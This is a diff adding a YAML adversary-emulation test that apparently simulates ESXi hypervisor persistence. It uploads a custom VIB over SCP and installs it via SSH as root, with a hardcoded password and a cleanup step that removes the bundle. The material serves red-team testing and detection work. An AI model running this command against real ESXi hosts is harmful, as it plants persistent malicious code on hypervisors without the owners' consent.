@@ -1,0 +1,25 @@
+---
+- id: bbe3f4e9185839aeffef4886610f137d
+  name: ESXi - Install a custom VIB on an ESXi host
+  description: 'An adversary can maintain persistence within an ESXi host by installing
+    malicious vSphere Installation Bundles (VIBs).
+
+    [Reference](https://www.mandiant.com/resources/blog/esxi-hypervisors-malware-persistence)
+
+    '
+  tactic: execution
+  technique:
+    attack_id: T1129
+    name: Server Software Component
+  platforms:
+    windows:
+      cmd:
+        command: PathToAtomicsFolder\..\ExternalPayloads\pscp.exe -pw pass 8585f6_atomicvibes.vib
+          root@atomic.local:/tmp && echo "" | "PathToAtomicsFolder\..\ExternalPayloads\plink.exe"
+          "atomic.local" -ssh  -l "root" -pw "pass" -m "94e443_esxi_vibinstall.txt"
+        payloads:
+        - 8585f6_atomicvibes.vib
+        - 94e443_esxi_vibinstall.txt
+        - e37bb5_esxi_vibremove.txt
+        cleanup: echo "" | "PathToAtomicsFolder\..\ExternalPayloads\plink.exe" "atomic.local"
+          -ssh  -l "root" -pw "pass" -m "e37bb5_esxi_vibremove.txt"
